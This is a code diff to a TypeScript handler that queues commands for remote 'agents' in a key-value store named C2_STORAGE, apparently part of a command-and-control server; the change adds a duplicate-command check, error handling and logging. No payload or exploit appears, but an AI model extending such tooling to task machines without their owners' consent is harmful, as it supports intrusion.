@@ -1,5 +1,6 @@
 import { json, error } from "../core/response"
 import { requireAdmin } from "../core/auth"
+import { Env } from "../types/env"
 
 export async function issueCommand(
   request: Request,
@@ -22,14 +23,30 @@ export async function issueCommand(
   }
 
   const commandId = crypto.randomUUID()
+  const commandKey = `cmd:${body.agentId}`
 
-  await env.C2_STORAGE.put(
-    `cmd:${body.agentId}`,
-    JSON.stringify({
-      id: commandId,
-      command: body.command
-    })
-  )
+  try {
+    // Check if command already exists for this agent
+    const existing = await env.C2_STORAGE.get(commandKey)
+    if (existing) {
+      return error("Command already pending for this agent", 409)
+    }
 
-  return json({ ok: true, commandId })
+    // Store command in KV
+    await env.C2_STORAGE.put(
+      commandKey,
+      JSON.stringify({
+        id: commandId,
+        command: body.command,
+        agentId: body.agentId
+      })
+    )
+
+    console.log('Command stored:', commandKey, commandId)
+
+    return json({ ok: true, commandId })
+  } catch (err) {
+    console.error('Error storing command:', err)
+    return error("Failed to store command", 500)
+  }
 }
